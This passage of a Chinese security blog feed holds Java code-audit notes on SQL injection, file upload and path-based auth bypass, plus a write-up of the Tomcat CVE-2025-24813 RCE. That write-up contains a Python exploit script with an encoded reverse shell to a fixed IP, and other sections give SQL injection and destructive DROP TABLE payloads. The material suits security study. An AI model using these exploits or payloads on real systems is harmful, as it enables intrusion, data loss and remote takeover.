Arrays.asList(<span class="hljs-string">&quot;g1ts&quot;</span>, <span class="hljs-string">&quot;g2ts&quot;</span>);<br>Query&lt;User&gt; query = session.createQuery(<span class="hljs-string">&quot;from users where name in (:names)&quot;</span>, User.class);<br>query.setParameter(<span class="hljs-string">&quot;names&quot;</span>, names);<br></code></pre></td></tr></table></figure><p>4.类实例（JavaBean）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">user1.setName(<span class="hljs-string">&quot;g1ts&quot;</span>);<br>Query&lt;User&gt; query = session.createQuery(<span class="hljs-string">&quot;from users where name =:name&quot;</span>, User.class);<br>query.setProperties(user1);<br></code></pre></td></tr></table></figure><p>5.HQL拼接方法</p><p> 这种方式是最常用，而且容易忽视且容易被注入的，通常做法就是对参数的特殊字符进行过滤，推荐大家使用 Spring工具包的StringEscapeUtils.escapeSql()方法对参数进行过滤：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.lang.StringEscapeUtils;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>  <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> StringEscapeUtils.escapeSql(<span class="hljs-string">&quot;&#x27;&quot;</span>);<br>  System.out.println(str);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h3><p>Hibernate支持使用原生SQL语句执行，所以其风险和JDBC是一致的，直接使用拼接的方法时会导致SQL注入</p><p>语句如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Query&lt;People&gt; query = session.createNativeQuery(<span class="hljs-string">&quot;select * from user where username = &#x27;&quot;</span> + username + <span class="hljs-string">&quot;&#x27; and password = &#x27;&quot;</span> + password + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br></code></pre></td></tr></table></figure><p>正确写法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">parameter</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;g1ts&quot;</span>;<br>Query&lt;User&gt; query = session.createNativeQuery(<span class="hljs-string">&quot;select * from user where name = :name&quot;</span>);<br>query.setParameter(<span class="hljs-string">&quot;name&quot;</span>,parameter);<br></code></pre></td></tr></table></figure><h2 id="预编译下的sql注入"><a href="#预编译下的sql注入" class="headerlink" title="预编译下的sql注入"></a>预编译下的sql注入</h2><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>预编译是将sql语句参数化，可预编译的语句，如 where语句中的内容是被参数化的。这就是说，预编译仅仅只能防御住可参数化位置的sql注入。那么，对于不可参数化的位置，预编译将没有任何办法。</p><p>不可参数化的位置：</p><ol><li>表名、列名</li><li>order by、group by</li><li>limit</li><li>join</li><li>等</li></ol><p>我们以order by举例，现在有一个sql语句如下（以下均为伪代码）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">SELECT * FROM users ORDER BY &#123;user_input&#125;;<br></code></pre></td></tr></table></figure><p>其中user_input是传递过来的参数，例如 id</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">SELECT * FROM users ORDER BY id;<br></code></pre></td></tr></table></figure><p>这个语句是没有问题的，但是如果user_input输入为 id;drop table users –</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">SELECT * FROM users ORDER BY id;drop table users --+<br></code></pre></td></tr></table></figure><p>这样就被成功注入了，而这种位置是不可被参数化的，所以是无法通过预编译防御的</p><h4 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h4><p>所以，对于sql注入存在两种情况，可参数化的，不可参数化的。</p><p>对于可参数化没商量，直接预编译解决一切。</p><p>而对于不可参数化的，只能通过设置白名单，过滤特殊符号，通过加引号强制转为字符串等方式进行拦截。</p>]]></content>
    
    
    <categories>
      
      <category>Java代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java代码审计</tag>
      
      <tag>漏洞学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2025-24813 RCE复现</title>
    <link href="/2025/06/19/CVE-2025-24813%20RCE%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/06/19/CVE-2025-24813%20RCE%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2025-24813-RCE复现"><a href="#CVE-2025-24813-RCE复现" class="headerlink" title="CVE-2025-24813 RCE复现"></a>CVE-2025-24813 RCE复现</h1><p>参考文章：</p><p><a href="https://blog.csdn.net/Dalock/article/details/146425886">Tomcat RCE（CVE-2025-24813）复现_cve-2025-24813 复现-CSDN博客</a></p><p><a href="https://www.freebuf.com/vuls/425025.html">CVE-2025-24813 RCE复现 - FreeBuf网络安全行业门户</a></p><p><a href="https://blog.meteorkai.top/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%83%A8%E5%88%86DefaultServlet-doPut">CVE-2025-24813 Tomcat RCE 分析复现 (meteorkai.top)</a></p><h4 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h4><h4 id="漏洞影响范围-1"><a href="#漏洞影响范围-1" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h4><ul><li>9.0.0.M1 &lt;&#x3D; Apache Tomcat &lt;&#x3D; 9.0.98</li><li>10.1.0-M1 &lt;&#x3D; Apache Tomcat &lt;&#x3D; 10.1.34</li><li>11.0.0-M1 &lt;&#x3D; Apache Tomcat &lt;&#x3D; 11.0.2</li></ul><h4 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h4><ol><li>DefaultServlet 写入功能启用：需要在<code>web.xml</code>中配置<code>readonly=false</code></li><li>PartialPUT请求支持：tomcat中默认支持分块上传</li><li>文件会话持久化启用：在 context.xml 中配置 PersistentManager 和 FileStore</li><li>存在反序列化的利用链：需要包含漏洞的库（这里使用commons-collections-3.2.1.jar）</li></ol><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><ol><li>Tomcat中文件会话持久化技术，<code>Content-Range</code>在Tomcat的HTTP PUT请求中主要实现用于大文件的分块传输，在文件上传未完成的情况下，会被临时储存在Tomcat的工作目录下<code>CATALINA_BASE/work/Catalina/localhost/ROOT</code>中</li><li>漏洞核心在于：对不完整的PUT请求上传的文件名处理机制：文件路径中的分隔符<code>/</code>会被转化为<code>.</code>。例如：对于PUT请求的路径<code>/evil/session</code>会被解析为<code>.evil.session</code>中</li><li>Tomcat的File会话存储默认路径同样位于：<code>CATALINA_BASE/work/Catalina/localhost/ROOT</code>，在Cookie中带有<code>JSESSIONID</code>字段时，Tomcat会将该字段中的<code>.id</code>与<code>.session</code>拼接，并从会话存储路径中寻找文件名为<code>.id.session</code>的文件，对该文件的内容进行反序列化操作，从而触发攻击链</li></ol><h4 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h4><ol><li>当存在反序列化利用链时，上传包含恶意的序列化数据文件（临时存储在<code>CATALINA_BASE/work/Catalina/localhost/ROOT</code>）</li><li>通过设置<code>JSESSIONID=.xxxx</code>来触发漏洞（位置也在<code>CATALINA_BASE/work/Catalina/localhost/ROOT</code>）</li></ol><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><ul><li><p>新建一个对应的tomcat项目</p></li><li><p>启用DefaultServlet写入</p><p>在<code>conf/web.xml</code>中，将DefaultServlet的readonly配置为false（默认true），启用写入功能：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>readonly<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>启用文件会话持久化并使用默认的会话存储位置</p><p>在<code>conf/context.xml</code>中，添加如下配置，开启File文件会话存储：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Manager</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;org.apache.catalina.session.PersistentManager&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Store</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;org.apache.catalina.session.FileStore&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">Manager</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ul><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><ul><li><p>尝试过使用burpsuit和yakit发送数据包，发现都不成功，也有发送的文件文件名被重写保存在&#x2F;tomcat文件下，尝试后发现只有使用python写脚本发包能够正常保存.session文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> requests<br> <br>target = <span class="hljs-string">&quot;http://172.31.80.1:8080/poc/session&quot;</span><br>target_poc = <span class="hljs-string">&quot;http://172.31.80.1:8080/&quot;</span><br> <br><span class="hljs-comment"># ysoserial.jar 文件路径</span><br>fp = <span class="hljs-string">&#x27;D:\java漏洞利用\ysoserial-all.jar&#x27;</span><br> <br>gadget = <span class="hljs-string">&quot;CommonsCollections5&quot;</span><br>linux_rshell = <span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjguMTMyLzc3NzcgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br>linux_cmd = <span class="hljs-string">&quot;touch /tmp/success&quot;</span><br>win_cmd = <span class="hljs-string">&quot;calc&quot;</span><br> <br>command = win_cmd<br> <br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(fp):<br>    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;jar file not found&#x27;</span>)<br>popen = subprocess.Popen([<span class="hljs-string">&#x27;java&#x27;</span>,<span class="hljs-string">&#x27;-jar&#x27;</span>,fp,gadget,command],<br>                         stdout=subprocess.PIPE)<br> <br>file_body = popen.stdout.read()<br> <br>headers = &#123;<br>    <span class="hljs-string">&#x27;Content-Length&#x27;</span>: <span class="hljs-string">&#x27;3000&#x27;</span>,<br>    <span class="hljs-string">&#x27;Content-Range&#x27;</span>: <span class="hljs-string">&#x27;bytes 0-3000/3200&#x27;</span><br>&#125;<br>response = requests.put(target, data=file_body, headers=headers, timeout=<span class="hljs-number">10</span>)<br><span class="hljs-comment"># print(response.text)</span><br> <br><span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Press Enter to continue...&quot;</span>)<br> <br>response = requests.get(target_poc, cookies=&#123;<span class="hljs-string">&#x27;JSESSIONID&#x27;</span>:<span class="hljs-string">&#x27;.poc&#x27;</span>&#125;, timeout=<span class="hljs-number">10</span>)<br></code></pre></td></tr></table></figure></li><li><p>在Catalina&#x2F;localhost&#x2F;ROOT&#x2F;org&#x2F;apache&#x2F;jsp路径下，可以看到成功上传了带有恶意序列化数据的文件</p><p><img src="/img/CVE02.png"></p><p>但是并未弹出计算器，显示服务器内部出错</p></li><li><p>分析后发现是导入tomcat的jar包时出现一些问题，jar包未导入库中，原因未知</p></li></ul><h4 id="源代码分析"><a href="#源代码分析" class="headerlink" title="源代码分析"></a>源代码分析</h4><ul><li><p>jar包导入时出现了问题，没有继续调试了，只看了文章</p></li><li><p>临时文件创建源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">doPut(DefaultServlet)-&gt;executePartialPut<br>条件：<br> 1.readOnly=<span class="hljs-literal">false</span><br> 2.Content-Range合法<br>executePartialPut方法核心控制：<br>将一个path中的/替换为.后当作文件名，然后写入到工作目录下的ROOT路径下的.poc.session中<br>走到<span class="hljs-built_in">return</span> contentFile时，的恶意文件已经写好<br></code></pre></td></tr></table></figure></li><li><p>反序列化漏洞触发过程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">触发点：load方法(其中的特殊函数:ObjectInputStream 反序列化漏洞的特殊函数)<br>-&gt;file方法(接受Cookie中的<span class="hljs-built_in">id</span>，然后与.session拼接起来，然后将文件名为.poc.session的File类型的属性返回回去)<br>-&gt;FileInpuStream(将文件内容以字节流的方式读出)<br>-&gt;readObject(进行反序列化，触发构造的攻击链)<br></code></pre></td></tr></table></figure></li></ul><h4 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h4><ul><li><p>从磁盘导入jdk时一直显示不是jdk有效路径</p><p>解决：更改jdk安装路径时必须将新文件夹命名为jdk1.8.0_版本，否则IDEA无法识别</p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java代码审计</title>
    <link href="/2025/05/27/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2025/05/27/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h2 id="Java代码审计"><a href="#Java代码审计" class="headerlink" title="Java代码审计"></a>Java代码审计</h2><ul><li>读懂一段代码：从下到上追踪，找到变量的传递与函数之间的关系，理清代码即可大致读懂</li><li>分析变量组成：打印出每个过程参数的值逐个分析(调试)</li></ul><h3 id="通用步骤"><a href="#通用步骤" class="headerlink" title="通用步骤"></a>通用步骤</h3><ul><li>寻找漏洞触发点</li><li>构造payload尝试利用漏洞</li></ul><h3 id="checklist"><a href="#checklist" class="headerlink" title="checklist"></a>checklist</h3><p><a href="https://mp.weixin.qq.com/s/Y90mGgCqzjj0T1NX9E5wDw">Java代码审计checklist（上） (qq.com)</a></p><p><a href="https://mp.weixin.qq.com/s/COXCjMItvrcOCNcqEfbmDg">JAVA攻防基础之代码审计 (qq.com)</a></p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><ul><li><p>三个模式</p><p>JDBC，Mybatis，Hibernate</p><p>JDBC与Mybatis：<a href="https://blog.csdn.net/keyboard_/article/details/127477755">持久层技术对比：Mybatis 与 JDBC 的区别到底在哪里_jdbc和mybatis的应用场景-CSDN博客</a></p></li><li><p>出现注入</p><ul><li>原生JDBC是否存在直接拼接sql语句(使用+，或者使用StringBuilder.append())，未经过预编译</li><li>Mybatis使用${}</li><li>Hibernate, JPA是默认经过预编译的，但是开发自己编写的sql语句，需要检查</li></ul></li><li><p>参考文章：<a href="https://mp.weixin.qq.com/s/9t3t6qxosGsKiXMIRtMoPw">JAVA常用框架SQL注入审计 (qq.com)</a></p></li><li><p>判断模式</p><ul><li>看项目中说明使用的技术框架</li><li>看引用中加载的那些技术框架</li><li>看配置源码中相关的配置文件</li></ul></li><li><p>入口确定</p><ol><li>是否使用预编译技术，预编译是否完整</li><li>定位sql语句上下文，查看是否有参数直接拼接，是否对模糊查询关键字的过滤</li><li>Mybatis框架则搜索${}，四种情况无法预编译：like模糊查询，order by排序，范围查询in，动态列名，表名，只能拼接，所以还是需要手工防注入<br>注：like和in语句直接使用#{}会报错，改为${}恢复正常但是无法预编译</li></ol></li></ul><p>​正确写法：<br>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs java">  mysql:<br>    select * from users where username like <span class="hljs-title function_">concat</span><span class="hljs-params">(<span class="hljs-string">&#x27;%&#x27;</span>,#&#123;username&#125;,<span class="hljs-string">&#x27;%&#x27;</span>)</span><br>  oracle:<br>    select * from users where username like <span class="hljs-string">&#x27;%&#x27;</span>||#&#123;username&#125;||<span class="hljs-string">&#x27;%&#x27;</span><br>  sqlserver:<br>    select * from users where username like <span class="hljs-string">&#x27;%&#x27;</span>+#&#123;username&#125;+<span class="hljs-string">&#x27;%&#x27;</span><br>  ```  <br><br><br>#### 步骤<br><br>- 找模式<br>- 搜关键字<br>- 追踪确定可控变量<br>- 确定路由<br>- 构造payload测试<br><br>#### jfinal_cms案例<br><br>- 查看配置文件发现是JDBC驱动<br><br>- 全局搜索append()关键字，寻找与sql相关的语句<br><br>  ![图片](/img/java审计/java审计<span class="hljs-number">01.</span>png)<br><br>  发现新定义了一个sql语句，并且使用了append()函数拼接<br><br>- 判断orderBy变量是否可控，有无过滤<br><br>  - 追踪getBaseForm()类与getOrderBy()方法发现<br><br>    ![](/img/java审计/java审计<span class="hljs-number">02.</span>png)<br><br>- 找到对应路由后访问抓包，发现数据包中有form.orderColumn参数，添加*号放到sqlmap中测试payload<br><br>#### oa_system-master案例<br><br>- 查看文字说明发现此oa系统使用的是Mybatis框架<br><br>- 指定文件掩码为 *.xml，全局搜索$&#123;<br><br>  ![](/img/java审计/java审计<span class="hljs-number">03.</span>png)<br><br>  跳转查看baseKey参数，全局搜索selece的id值sortMyNotice<br><br>- 寻找baseKey的实现，确定路由为(/informlistpaging)<br><br>  ![](/img/java审计/java审计<span class="hljs-number">04.</span>png)<br><br>- 找到路由后访问抓取数据包，使用sqlmap测试payload<br><br>#### RuoYi案例<br><br>- 在源码简介处发现使用的Mybatis框架<br><br>- 搜索关键字$&#123;<br><br>- 找到可能存在不安全写法的地方(筛选出可能的注入点，可执行sql语句)<br><br>  ![](/img/java审计/java审计<span class="hljs-number">05.</span>png)<br><br>  追踪updateDeptStatus的用法<br><br>- 全局搜索updateDeptStatus关键字逐个查找用法(寻找路由关系)<br><br>- 直接搜索updateDeptStatus关键字发现此关键字出现在service层中<br><br>  - 基于springboot中，执行sql语句的三个调用<br>    - 业务层调用Dao层<br>    - controller调用service层间接调用Dao层<br>    - controller直接调用Dao层<br>  - 路由关系一般写在controller中<br><br>- 选中updateDeptStatus关键字，点击查找用法，发现updateDept调用了此方法，继续追踪此方法，找到SysDeptController文件中有调用updateDept方法，<br><br>  顺利找到路由关系<br><br>  $&#123;-&gt;updateDeptStatus-&gt;updateParentDeptStatus-&gt;updateDept-&gt;/system/dept/edit<br><br>- 测试payload<br><br>  - 直接访问url地址发现报错<br><br>  - 根据中文注释找到功能点抓取数据包，成功找到/system/dept/edit路由的数据<br><br>  - 发现数据包中没有注入参数值，尝试手动添加<br><br>  - 使用sqlmap无法成功注入，使用手工注入<br><br>  - ```java<br>    DeptName=<span class="hljs-number">1</span>&amp;DeptId=<span class="hljs-number">100</span>&amp;ParentId=<span class="hljs-number">12</span>&amp;&amp;status=<span class="hljs-number">0</span>&amp;OrderNum=<span class="hljs-number">1</span>&amp;ancestors=<span class="hljs-number">0</span>)or(extractvalue(<span class="hljs-number">1</span>,concat((select <span class="hljs-title function_">user</span><span class="hljs-params">()</span>))));#<br></code></pre></td></tr></table></figure></p><ul><li>使用括号绕过空格过滤</li></ul><h3 id="文件安全"><a href="#文件安全" class="headerlink" title="文件安全"></a>文件安全</h3><p><a href="https://blog.csdn.net/god_zzZ/article/details/108104523">Java代码审计：文件篇&#x2F;文件上传&#x2F;文件读取&#x2F;目录遍历_潜在路径遍历(文件读取) 打开文件以读取其内容。文件名来自输入参数。如果将未过-CSDN博客</a></p><ul><li><p>关键字查询</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A106.png"></p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A107.png"></p></li></ul><h4 id="Inxedu案例-前台文件上传"><a href="#Inxedu案例-前台文件上传" class="headerlink" title="Inxedu案例(前台文件上传)"></a>Inxedu案例(前台文件上传)</h4><ul><li><p>搭建网站后直接寻找功能点，发现有文件上传</p></li><li><p>尝试上传文件找到路由</p></li><li><p>此网站源码将文件安全代码封装在jar包中，&#x2F;UploadController.class，需要通读目录，理清结构才能找到</p></li><li><p>根据上传文件时找到的路由，确定控制代码</p></li><li><p>发现是黑名单过滤，只过滤jsp文件</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A108.png"></p></li><li><p>使用工具生成jspx文件，修改前端白名单过滤代码，成功上传</p></li></ul><h4 id="Tmall案例"><a href="#Tmall案例" class="headerlink" title="Tmall案例"></a>Tmall案例</h4><h5 id="后台文件上传"><a href="#后台文件上传" class="headerlink" title="后台文件上传"></a>后台文件上传</h5><ul><li><p>搜索文件安全相关关键字</p></li><li><p>搜索new File，找到文件上传相关代码</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A109.png"></p><p>文件上传过滤一般关注后缀，所以在此段代码中应该关注文件名后缀是如何获取的</p><p>发现这段代码是直接获取了原文件后缀后并没有过滤，而是直接上传了</p></li><li><p>开始测试，发现有前端验证，抓包后更改后缀为jsp可以正常上传</p></li></ul><h5 id="过滤器鉴权"><a href="#过滤器鉴权" class="headerlink" title="过滤器鉴权"></a>过滤器鉴权</h5><ul><li><p>找到过滤器核心代码AdminPermissionFilter类</p></li><li><p>找到核心控制方法doFilter</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A110.png"></p><p>发现鉴权存在了漏洞，容易越权</p></li><li><p>进行测试</p><ul><li>在数据包url中加上 &#x2F;admin&#x2F;login&#x2F;..&#x2F;..&#x2F;</li><li>成功绕过鉴权</li></ul></li></ul><h4 id="RuoYi-4-5-0-文件下载"><a href="#RuoYi-4-5-0-文件下载" class="headerlink" title="RuoYi-4.5.0(文件下载)"></a>RuoYi-4.5.0(文件下载)</h4><ul><li><p>搜索关键字new FileInputStream</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A111.png"></p><p>找到这段相关代码控制字节输出，但是发现这个类中没有路由关系，不能直接触发此漏洞</p></li><li><p>尝试查找是否有用过writeBytes方法</p></li><li><p>查找用法后发现，CommonController类中fileDownload方法和resourceDownload方法调用了此方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/common/download/resource&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">resourceDownload</span><span class="hljs-params">(String resource, HttpServletRequest request, HttpServletResponse response)</span><br>            <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        <span class="hljs-comment">// 本地资源路径</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">localPath</span> <span class="hljs-operator">=</span> Global.getProfile();<br>        <span class="hljs-comment">// 数据库资源地址</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">downloadPath</span> <span class="hljs-operator">=</span> localPath + StringUtils.substringAfter(resource, Constants.RESOURCE_PREFIX);<br>        <span class="hljs-comment">// 下载名称</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">downloadName</span> <span class="hljs-operator">=</span> StringUtils.substringAfterLast(downloadPath, <span class="hljs-string">&quot;/&quot;</span>);<br><br>        response.setContentType(MediaType.APPLICATION_OCTET_STREAM_VALUE);<br>        FileUtils.setAttachmentResponseHeader(response, downloadName);<br><br>        FileUtils.writeBytes(downloadPath, response.getOutputStream());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>打印出localPath与downloadPath的值查看resource参数是如何构成的</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A112.png"></p><p>代码释义</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 资源文件下载接口</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> resource 资源路径参数（包含资源标识符）</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> request HTTP请求对象</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> response HTTP响应对象</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> Exception 可能抛出的异常</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@GetMapping(&quot;/common/download/resource&quot;)</span>  <span class="hljs-comment">// 定义GET请求映射路径</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">resourceDownload</span><span class="hljs-params">(String resource, 